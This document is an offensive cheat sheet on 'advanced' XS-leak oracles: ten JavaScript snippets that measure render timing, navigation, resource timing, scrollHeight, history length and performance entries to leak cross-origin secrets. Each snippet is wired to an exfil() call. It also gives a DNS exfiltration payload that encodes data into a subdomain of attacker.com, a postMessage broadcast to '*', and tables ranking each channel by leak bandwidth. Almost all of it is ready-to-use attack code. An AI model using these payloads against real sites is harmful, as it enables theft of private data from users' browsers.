# Advanced oracles — the subtler XS-leak channels

The less-common oracles — the ones that work when the usual channels fail.

---

## 1. The DOM-timing oracle — a render-cost read

```js
var t0=performance.now();
// trigger a render whose cost differs with the content
// e.g. a complex selector, a layout that depends on the result
exfil('render='+Math.round(performance.now()-t0));
```

```text
a render whose cost differs with the content — a DOM-timing oracle —
a slower selector or a layout-dependent cost is the bit.
```

## 2. The navigation-timing oracle — a redirect's cost

```js
var t0=performance.now();
var f=document.createElement('iframe');
f.src='https://t/x?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
document.body.appendChild(f);
```

```text
a page that redirects on a hit vs stays on a miss — the navigation's
cost differs — a timing oracle with a sharper signal (a redirect is
a discrete event).
```

## 3. The resource-timing oracle — a load-duration read

```js
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

```text
the PerformanceResourceTiming API records a subresource's load
duration — a 'was it loaded' + 'how long' read — a cache oracle
with a lower noise floor.
```

## 4. The window.open oracle — a navigation check

```js
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);
```

```text
did the navigation happen — a redirect check — a page that redirects
on a hit vs stays on a miss — the window's state is the bit.
```

## 5. The scrollHeight oracle — a content-size leak

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
document.body.appendChild(f);
```

```text
the page's content height differs with the result count — a
content-length leak — a same-origin or a same-document read.
```

## 6. The history.back/forward oracle — a navigation state

```js
// a navigation the bot's page caused — 'did the back-stack grow'
exfil('history='+window.history.length);
```

```text
a navigation's side-effect on the history stack — a count/state
oracle — 'how many entries' = 'how many navigations'.
```

## 7. The performance-entries oracle — a resource-load read

```js
// all loaded resources — 'was this URL loaded'
performance.getEntries().forEach(e=>exfil(e.name));
```

```text
the PerformanceEntries API lists every loaded resource — 'was this
URL loaded' = 'was it fetched' — a load oracle.
```

## 8. The DOM-writeback oracle — a screenshotting bot

```js
// the secret rendered visibly — the screenshot IS the read
document.body.innerHTML=
  '<div style="position:fixed;inset:0;background:#fff;font-size:80px">'+leaked+'</div>'
```

```text
a bot that screenshots the page — the rendered secret IS the read-back
— no listener, no server-state read needed.
```

## 9. The DNS exfil oracle — a subdomain carrier

```js
new Image().src='https://'+btoa(d)+'.attacker.com/'
```

```text
a DNS lookup carries the data in the subdomain — an airgapped case
where the bot can resolve DNS but not reach your listener directly.
```

## 10. The postMessage oracle — a broadcast carrier

```js
parent.postMessage(leaked,'*')
```

```text
a postMessage broadcast — the data transmitted to '*' — a real read
primitive (a broadcast, not a measure) — requires a listener in a
parent/opener context.
```

## 11. The per-advanced-oracle selection

```text
a render-cost difference       → DOM-timing
a redirect's cost              → navigation-timing
a subresource's duration       → resource-timing
a navigation check             → window.open
a content-size leak            → scrollHeight
a navigation count             → history.length
a loaded-resource list         → performance-entries
a screenshotting bot           → DOM-writeback
a DNS-resolvable bot           → DNS exfil
a parent/opener listener       → postMessage
```

## 12. The per-advanced-oracle bandwidth

```text
DOM-timing           — ~1 bit — a render cost
navigation-timing    — ~1 bit — a redirect cost
resource-timing      — ~1 bit + a duration
window.open          — 1 bit — a navigated/not
scrollHeight         — log2(N) bits — a size
history.length       — log2(N) bits — a count
performance-entries  — 1 bit — a loaded/not
DOM-writeback        — the whole secret — one visit
DNS exfil            — the whole secret — one visit
postMessage          — the whole secret — one visit
```
